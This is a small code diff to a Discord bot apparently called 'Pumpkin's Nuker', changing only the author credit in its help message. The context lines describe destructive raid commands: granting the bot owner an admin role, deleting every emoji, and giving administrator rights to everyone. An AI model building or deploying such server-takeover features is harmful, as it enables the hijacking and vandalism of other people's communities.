@@ -299,7 +299,7 @@ async def cmd(ctx):
     embed.add_field(name='!4', value='gives an admin role to the owner of the bot', inline=False)
     embed.add_field(name='!5', value='deletes all emoji in the server', inline=False)
     embed.add_field(name='!6', value='gives administrator perm to everyone', inline=False)
-    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by <@800689202588811294>\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
+    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by Pumpkin\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
   
     await ctx.author.send(embed=embed)
 
